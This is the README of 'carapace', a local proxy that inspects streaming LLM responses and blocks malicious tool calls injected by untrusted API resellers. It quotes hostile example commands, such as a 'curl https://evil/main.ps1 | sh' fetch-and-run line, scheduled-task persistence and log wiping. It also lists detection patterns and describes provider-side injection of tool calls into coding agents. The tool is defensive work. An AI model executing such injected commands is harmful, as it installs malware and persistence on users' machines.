# carapace

**A local guard against malicious LLM providers.**

Put `cape` between your AI client and any upstream model endpoint. It inspects
streaming responses, reassembles `tool_use` payloads before they execute, and
blocks high-severity injections like `curl | sh`, persistence setup, proxy
rewrites, and known IoCs.

If you buy cheap API access from sketchy resellers, `carapace` is the condom.

---

## What problem this solves

Cheap LLM API resellers are a real malware channel.

The malicious provider does **not** need RCE on your machine. It just speaks
normal Anthropic / OpenAI protocol and injects a `tool_use` block into the
model response. Your client then obediently executes:

- `curl https://evil/main.ps1 | sh`
- `schtasks /create ...`
- proxy / DNS rewrites
- log wiping / anti-forensics

This targets users of:

- Claude Code
- Cursor
- Cline / Roo / Kilo Code
- Aider
- any client that can point at a custom base URL

`carapace` protects the **wire**, not one specific client.

```text
AI client  ──►  carapace proxy  ──►  upstream LLM provider
                  │
                  ├─ reassemble SSE tool_use chunks
                  ├─ detect unsolicited tool calls
                  ├─ block high-severity payloads
                  ├─ run canary scans on providers
                  └─ log / encrypt forensics
```

---

## Why this exists

Existing GenAI security products mostly protect **companies from users**.

`carapace` protects **users from providers**.

That difference matters.

- **Prompt Security / Lakera / Guardrails**: enterprise app security
- **ModelScan / Protect AI**: model file / supply-chain scanning
- **carapace**: local runtime guard for grey endpoints and local coding agents

---

## What it catches

| Threat | Status | Notes |
|---|---|---|
| Unsolicited `tool_use` from upstream | ✅ | If the client never declared the tool, this is high severity by default |
| `curl \| sh`, `irm \| iex`, `schtasks`, etc | ✅ | RE2 behavioural rules |
| Chunked / split payloads across SSE deltas | ✅ | Tool input is reassembled before inspection |
| Known malicious domains / hosts | ✅ | Built-in blocklist + remote feed support |
| Provider canary behaviour | ✅ | `cape scan` probes a provider with harmless prompts |
| Host IoCs from known campaigns | ✅ | `cape audit` / `cape sentinel` |
| Encrypted forensic capture | ✅ | Optional encrypted append-only store |
| Passive prompt theft | ❌ | Structural limitation: if the provider silently reads prompts, the wire looks normal |
| Malware already embedded in a downloaded model file | ❌ | Use ModelScan / supply-chain scanning for that |

---

## What makes it different from holone

`holone` proved the niche is real. `carapace` is the harder, more defensible
version.

| Capability | holone | carapace |
|---|---|---|
| License | MIT | **Apache-2.0** |
| Key handling | plain env pass-through | `zeroize::Secret` |
| Stream defence | regex over provider output | **streaming + reassembly** before verdict |
| False-positive control | every tool_use suspicious | **declared-tool parsing** for Anthropic/OpenAI |
| Provider screening | basic scan | **canary probe + signed remote feeds** |
| Host response | none | **audit + sentinel** |
| Forensics | plaintext log | **optional encrypted forensics** |
| Protocol surface | Anthropic/OpenAI | Anthropic, OpenAI, z.ai, DeepSeek, Kimi-aware |
| Release pipeline | ad hoc | **CI + tagged release workflow** |

---

## Install

### From source

```bash
cargo install --path .
```

### Build locally

```bash
cargo build --release
./target/release/cape --help
```

### Future one-liner install

Once the first tagged release is published:

```bash
cargo binstall carapace
```

---

## Quick start

### 1. Put `cape` in front of your provider

```bash
cape proxy \
  --upstream https://api.anthropic.com \
  --upstream-key "$ANTHROPIC_API_KEY"
```

### 2. Point your client at `carapace`

```bash
export ANTHROPIC_BASE_URL=http://127.0.0.1:8787
```

### 3. Work as usual

High-severity injected tool payloads are substituted before the client sees
them.

---

## Provider scan

Before trusting a cheap endpoint:

```bash
cape scan --upstream https://api.example-reseller.dev --key "$API_KEY"
```

What `scan` does:

- sends a harmless, tool-less prompt
- requests streaming
- picks the parser from the actual response, not just the URL
- returns a risk score and verdict
- exits with code `2` on `High` / `Critical`

Example:

```text
risk: High (85)
categories: proto-tooluse-unsolicited dl-curl-pipe-sh
protocol: anthropic
bytes: 1183
note: Clean means no active injection was observed on this probe. It does NOT rule out passive prompt theft or future behaviour changes.
```

---

## Host audit & sentinel

### One-shot host scan

```bash
cape audit
```

Checks for:

- suspicious long-running processes (`awproxy.exe`, `tun2socks`, etc.)
- proxy env vars pointing to bad SOCKS endpoints
- known drop paths
- scheduled-task / persistence markers

### Background monitor

```bash
cape sentinel --interval 30s
```

Re-runs audit on an interval and reports **new** findings.

---

## Encrypted forensics

If you want replay-grade evidence without storing prompts in plaintext:

```bash
cape proxy \
  --upstream https://api.anthropic.com \
  --upstream-key "$ANTHROPIC_API_KEY" \
  --forensics ~/.carapace/forensics.log \
  --forensics-pass "correct horse battery staple"
```

This stores suspicious traffic under ChaCha20-Poly1305 with per-record random
nonces.

---

## Signed remote feed

Feeds are a core part of the moat.

Fetch a signed ruleset + blocklist bundle:

```bash
cape feed \
  --url https://example.com/feed/manifest.json \
  --pubkey "$CAPE_FEED_PUBKEY" \
  --out ~/.carapace/feed
```

This:

- downloads `manifest + rules + blocklist`
- verifies Ed25519 signature
- verifies SHA256 integrity hashes
- writes local `rules.json`, `blocklist.json`, `manifest.json`

The open-source core can **verify** feeds. The commercial cloud can **publish**
better ones.

---

## Provider scoring / legit-check foundation

`carapace` now ships the first local foundation for provider scoring.

```bash
cape score \
  --upstream https://api.deepseek.com \
  --key "$API_KEY" \
  --format markdown \
  --out provider-report.md \
  --badge provider-badge.svg
```

What it does:

- runs the same canary probe as `cape scan`
- combines transport, identity, active behaviour, and protocol hygiene into a
  **0-100 score**
- emits a **letter grade** (`A`..`F`)
- writes a human-readable report and a small SVG badge

This is the technical base for future legit-check / `Verified Clean` style
provider audits.

### Certification bundle

Generate a publish-ready bundle:

```bash
cape certify \
  --upstream https://api.deepseek.com \
  --key "$API_KEY" \
  --out ./cert-out \
  --signing-key "$CAPE_CERTIFY_SECRET"
```

Outputs:

- `report.md`
- `badge.svg`
- `entry.json` (optionally signed)

### One-shot verification pipeline

If you want the whole flow in one command:

```bash
cape verify \
  --upstream https://api.deepseek.com \
  --key "$API_KEY" \
  --out ./verify-out \
  --registry ~/.carapace/registry.json
```

This runs:

- scan
- score
- certify
- add to local registry

### Local trust registry

Cache certified providers locally:

```bash
cape registry add --entry ./cert-out/entry.json
cape registry list
cape registry show --host api.deepseek.com
cape registry verify --pubkey "$CAPE_FEED_PUBKEY"
```

This turns one-off certification artifacts into a local trust network you can
query and verify later.

---

## LLM judge slow-path

Some payloads are too weird for regex alone.

`carapace` ships an optional LLM judge module for low-confidence cases.

Configure a trusted judge:

```bash
export CAPE_JUDGE_URL=https://api.deepseek.com/v1
export CAPE_JUDGE_KEY=...
export CAPE_JUDGE_MODEL=deepseek-chat
```

The judge is **not** the primary engine. It is a second opinion for medium-risk
cases.

---

## Tested surface

Current automated suite:

- **35 unit tests**
- **2 end-to-end tests**

Notable e2e cases:

- chunked malicious payload split across multiple SSE deltas is blocked
- legitimate declared tool call passes through untouched

---

## Current commands

```bash
cape proxy
cape scan
cape score
cape certify
cape verify
cape registry
cape audit
cape sentinel
cape feed
```

---

## Roadmap

### Shipped

- v0.1 — initial proxy skeleton
- v0.3 — streaming chunk reassembly + chunked-bypass e2e
- v0.4 — declared tool parsing, false positives killed
- v0.5 — canary scan + feed manifest primitives
- v0.6/v0.7/v0.8 — signed feeds, audit, sentinel, encrypted forensics, extra adapters
- v0.9 — LLM judge, `cape feed`, CI/CD, binstall metadata

### Next

- v1.0 — first tagged release, install docs, launch assets
- v1.1 — remote feed hot-reload in proxy
- v1.2 — richer z.ai / DeepSeek specific protocol quirks
- v1.3 — better Windows persistence coverage

---

## License & business model

The local proxy is open-source under **Apache-2.0**.

That is deliberate.

- OSS for trust and distribution
- proprietary cloud for revenue and moat
- trademark / brand / future `Verified Clean` badge kept separate

So:

- code: open core
- feeds / telemetry / provider scoring: premium layers
- certification / audits: paid service

---

## Limitations

This is harm reduction, not a mathematical proof of safety.

If a provider only **reads** your prompts and never injects tools, the wire can
look perfectly normal.

So the hard rule still stands:

> Do not send secrets to untrusted providers.

If you already did, rotate those keys.

---

## Repository

- GitHub: <https://github.com/TaroHarado/carapace>
- Binary: `cape`

---

## Status

This repo is now technically credible enough to ship publicly.

The next real bottleneck is no longer code.

It is **distribution**.
